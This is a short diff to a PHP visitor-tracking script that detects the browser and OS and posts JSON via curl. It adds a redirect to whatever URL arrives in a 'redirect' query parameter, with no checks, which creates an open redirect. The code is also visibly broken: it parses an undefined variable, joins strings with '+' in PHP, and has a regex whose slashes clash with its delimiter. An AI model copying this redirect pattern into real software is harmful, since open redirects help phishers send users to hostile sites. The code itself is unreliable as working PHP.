@@ -1,5 +1,6 @@
 <?php
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
+parse_str($url_components['query'], $params); 
 function getOS() { 
     global $user_agent;
     $os_platform    =   "SPAM BOT";
@@ -44,7 +45,7 @@ function getBrowser() {
                             '/msie/i'       =>  'Internet Explorer',
                             '/firefox/i'    =>  'Firefox',
 			                '/Mozilla/i'    =>	'Mozila',
-			                '/Mozilla/5.0/i'=>	'Mozila',
+			                '/Mozilla/5.0/i'=>	'Mozila5',
                             '/safari/i'     =>  'Safari',
                             '/chrome/i'     =>  'Chrome',
                             '/edge/i'       =>  'Edge',
@@ -78,5 +79,6 @@ curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
 curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt( $exec, CURLOPT_HEADER, 0);
 curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
+header("Location: " + $params['redirect']); 
 $response = curl_exec( $exec );
 ?>
